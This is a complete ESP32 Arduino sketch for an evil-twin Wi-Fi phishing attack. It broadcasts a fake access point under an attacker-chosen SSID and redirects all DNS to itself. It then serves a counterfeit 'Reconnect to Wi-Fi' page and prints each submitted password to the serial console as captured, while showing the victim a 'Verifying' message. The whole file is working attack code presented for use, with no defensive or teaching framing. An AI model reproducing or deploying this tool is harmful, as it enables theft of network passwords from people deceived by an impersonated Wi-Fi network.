#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);

String inputSSID = "";
String inputPASS = "";

DNSServer dnsServer;
WebServer server(80);

// ==== FAKE LOGIN PAGE ====
const char loginPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Wi-Fi Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      background-color: #f4f4f4;
      font-family: "Segoe UI", sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: white;
      padding: 2rem;
      border-radius: 10px;
      box-shadow: 0 8px 16px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 380px;
      text-align: center;
    }
    h2 {
      margin-top: 0;
      font-size: 1.4rem;
      color: #333;
    }
    p {
      font-size: 0.95rem;
      color: #666;
      margin-bottom: 1.5rem;
    }
    input[type="password"] {
      width: 100%;
      padding: 12px;
      font-size: 1rem;
      margin-bottom: 1rem;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    input[type="submit"] {
      width: 100%;
      padding: 12px;
      font-size: 1rem;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background 0.3s;
    }
    input[type="submit"]:hover {
      background-color: #0056b3;
    }
    .footer {
      margin-top: 1.5rem;
      font-size: 0.75rem;
      color: #999;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Reconnect to Wi-Fi</h2>
    <p>please confirm your Wi-Fi password.</p>
    <form method="POST" action="/login">
      <input type="password" name="password" placeholder="Wi-Fi Password" required>
      <input type="submit" value="Continue">
    </form>
    <div class="footer">&copy; 2025 All rights reserved.</div>
  </div>
</body>
</html>
)rawliteral";

void printSuper() {
  Serial.println(F(R"rawliteral(
   _____                             _____                 
  / ____|                           |  __ \
 | (___   _   _  _ __    ___  _ __  | |__) |__ _  ___  ___ 
  \___ \ | | | || '_ \  / _ \| '__| |  ___// _` |/ __|/ __|
  ____) || |_| || |_) ||  __/| |    | |   | (_| |\__ \\__ \
 |_____/  \__,_|| .__/  \___||_|    |_|    \__,_||___/|___/
                | |                                        
                |_| 
                                                       
)rawliteral"));
  delay(1000);
  }

void waitForSerialInput() {
  Serial.println("📶 Enter SSID:");
  while (inputSSID == "") {
    if (Serial.available()) {
      inputSSID = Serial.readStringUntil('\n');
      inputSSID.trim();
    }
  }

  Serial.println("🔐 Enter Password (can be empty):");
  while (inputPASS == "") {
    if (Serial.available()) {
      inputPASS = Serial.readStringUntil('\n');
      inputPASS.trim();
      break;
    }
  }
}

void handleLogin() {
  String password = server.arg("password");
  Serial.println("🟢 Captured password: " + password);
  server.send(200, "text/html", "<h3>Verifying... Please wait.</h3>");
}

void setup() {
  Serial.begin(115200);
  delay(500); 

  printSuper();

  waitForSerialInput();

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(inputSSID.c_str(), inputPASS.c_str());

  Serial.println("✅ Fake AP running");
  Serial.println("SSID: " + inputSSID);
  Serial.println("PASS: " + (inputPASS == "" ? "(open)" : inputPASS));

  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/", HTTP_GET, []() {
    server.send(200, "text/html", loginPage);
  });

  server.on("/login", HTTP_POST, handleLogin);

  server.onNotFound([]() {
    server.send(200, "text/html", loginPage);
  });

  server.begin();
  Serial.println("🌐 Captive portal ready");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
